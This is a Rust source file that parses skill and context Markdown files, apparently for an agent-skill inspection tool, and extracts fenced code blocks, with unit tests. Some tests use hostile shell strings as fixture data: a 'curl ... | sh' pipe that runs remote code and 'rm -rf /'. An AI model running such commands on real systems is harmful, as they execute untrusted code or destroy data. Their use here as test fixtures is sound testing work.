//! The parsed representation of a skill/context Markdown file, plus hand-rolled
//! fenced-code extraction (no Markdown parser dependency).

use serde::Serialize;
use std::path::{Path, PathBuf};

/// Type of documentation file being parsed.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum DocKind {
    Skill,
    Context,
    Rules,
}

/// A fenced code block extracted from a documentation file.
#[derive(Debug, Clone, PartialEq)]
pub struct Fence {
    pub lang: String,
    /// 1-based line number of the first content line inside the fence (the line just after the opening delimiter).
    pub start_line: usize,
    pub lines: Vec<String>,
}

/// A parsed skill or context documentation file containing extracted fenced code blocks.
#[derive(Debug, Clone)]
pub struct SkillDoc {
    pub source: PathBuf,
    pub display: String,
    pub kind: DocKind,
    pub raw: String,
    pub fences: Vec<Fence>,
}

/// Human-facing name: the parent directory for a `SKILL.md` (skills are keyed
/// by folder), otherwise the file name.
fn display_name(path: &Path, kind: DocKind) -> String {
    if kind == DocKind::Skill {
        if let Some(parent) = path.parent().and_then(|p| p.file_name()) {
            return parent.to_string_lossy().into_owned();
        }
    }
    path.file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_else(|| path.to_string_lossy().into_owned())
}

/// A fence opener is a line whose trimmed-start begins with ``` or ~~~. The
/// same marker char and length (>=3) must close it. The info string is the rest
/// of the opener line, first whitespace-delimited word lowercased as `lang`.
fn fence_marker(line: &str) -> Option<(char, usize)> {
    let t = line.trim_start();
    let c = t.chars().next()?;
    if c != '`' && c != '~' {
        return None;
    }
    let run = t.chars().take_while(|&x| x == c).count();
    if run >= 3 {
        Some((c, run))
    } else {
        None
    }
}

pub fn parse_doc(path: &Path, kind: DocKind, text: &str) -> SkillDoc {
    let mut fences = Vec::new();
    let mut open: Option<(char, usize, String, usize, Vec<String>)> = None;

    for (idx, line) in text.lines().enumerate() {
        match &mut open {
            None => {
                if let Some((c, run)) = fence_marker(line) {
                    let info = line.trim_start().trim_start_matches(c).trim();
                    let lang = info
                        .split_whitespace()
                        .next()
                        .unwrap_or("")
                        .to_ascii_lowercase();
                    open = Some((c, run, lang, idx + 2, Vec::new()));
                }
            }
            Some((c, run, lang, start, buf)) => {
                // A closing fence: same char, run length >= opener, nothing but
                // the marker (info strings are only allowed on the opener).
                let is_close = fence_marker(line)
                    .map(|(cc, rr)| cc == *c && rr >= *run && line.trim().chars().all(|x| x == *c))
                    .unwrap_or(false);
                if is_close {
                    fences.push(Fence {
                        lang: std::mem::take(lang),
                        start_line: *start,
                        lines: std::mem::take(buf),
                    });
                    open = None;
                } else {
                    buf.push(line.to_string());
                }
            }
        }
    }
    // Unclosed fence at EOF still yields a block.
    if let Some((_, _, lang, start, buf)) = open {
        fences.push(Fence {
            lang,
            start_line: start,
            lines: buf,
        });
    }

    SkillDoc {
        source: path.to_path_buf(),
        display: display_name(path, kind),
        kind,
        raw: text.to_string(),
        fences,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    #[test]
    fn extracts_fenced_block_with_lang() {
        let md = "intro\n```bash\ncurl http://x.sh | sh\necho done\n```\ntail\n";
        let doc = parse_doc(Path::new("SKILL.md"), DocKind::Skill, md);
        assert_eq!(doc.fences.len(), 1);
        assert_eq!(doc.fences[0].lang, "bash");
        assert_eq!(
            doc.fences[0].lines,
            vec!["curl http://x.sh | sh", "echo done"]
        );
    }

    #[test]
    fn unclosed_fence_runs_to_eof() {
        let md = "```sh\nrm -rf /\n";
        let doc = parse_doc(Path::new("x.md"), DocKind::Context, md);
        assert_eq!(doc.fences.len(), 1);
        assert_eq!(doc.fences[0].lines, vec!["rm -rf /"]);
    }

    #[test]
    fn tilde_fence_and_empty_info_string() {
        let md = "~~~\nls -la\n~~~\n";
        let doc = parse_doc(Path::new("x.md"), DocKind::Context, md);
        assert_eq!(doc.fences.len(), 1);
        assert_eq!(doc.fences[0].lang, "");
        assert_eq!(doc.fences[0].lines, vec!["ls -la"]);
    }

    #[test]
    fn display_name_is_parent_dir_for_skill_md() {
        let doc = parse_doc(Path::new("/a/my-skill/SKILL.md"), DocKind::Skill, "");
        assert_eq!(doc.display, "my-skill");
    }

    #[test]
    fn display_name_is_file_name_for_context() {
        let doc = parse_doc(Path::new("/a/b/CLAUDE.md"), DocKind::Context, "");
        assert_eq!(doc.display, "CLAUDE.md");
    }

    #[test]
    fn raw_is_preserved_verbatim() {
        let md = "line1\nline2\n";
        let doc = parse_doc(Path::new("x.md"), DocKind::Context, md);
        assert_eq!(doc.raw, md);
    }

    #[test]
    fn start_line_points_at_first_content_line() {
        let md = "intro\n```bash\ncurl http://x.sh | sh\n```\n";
        let doc = parse_doc(Path::new("SKILL.md"), DocKind::Skill, md);
        assert_eq!(doc.fences.len(), 1);
        // Opening ``` is on line 2 (1-based), first content line is on line 3.
        assert_eq!(doc.fences[0].start_line, 3);
    }
}
